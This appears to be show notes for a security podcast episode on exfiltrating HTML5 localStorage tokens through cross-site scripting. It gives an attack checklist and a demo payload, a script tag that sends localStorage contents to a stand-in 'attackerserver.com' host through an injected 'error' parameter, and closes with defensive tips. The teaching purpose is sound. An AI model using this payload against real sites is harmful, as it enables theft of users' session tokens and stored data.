HTML5 Storage Exfil via XSS - Tradecraft Security Weekly - Episode #23

# XSS Overview
- Reflected: Non-persistent
- Persistent: Stored somewhere
- DOM-based: Client-side only
- Re-dressing HTML
- CSRF: The Big Brother
# Attack all the things
- Check all URL parameters (GET)
- Check all Form parameters (POST)
- Check all request headers
- Check all cookies
	- Inject XSS via 'error' parameter
	- Steal localStorage token
	- Exfil data to remote server
# HTML5 LocalStorage
- Offline Storage
- Should never be trusted!
- Steal all the things:
	- localStorage.getItem()
- Infect all the things:
	- localStorage.setItem()
- Onjects shared by Origin (Same Origin Policy)
# DEMO
- check in console using localStorage.getItem()to find the parameter we want
```
<script>$.get('http://attackerserver.com:8080/?'+localStorage.getItem('stuff-tosteal'));</script>
```
- pass payload into the ?error=
# Additional ideas...
- Load external scripts via XSS
- Inject payloads that may phone home
- Combine XSS w/ CSRF
- So.Many.Bypasses
- Polyglots!!!
# For the Blue Team
- Escape HTML, Attributes, JavaScript, JSON, CSS & URL (& to &amp; and < to &lt; and > to &gt; and etc..)
- Use mature HTML Sanitization library
- Use HTTPOnly and Secure Flags on cookies
- Implement Content Security Policy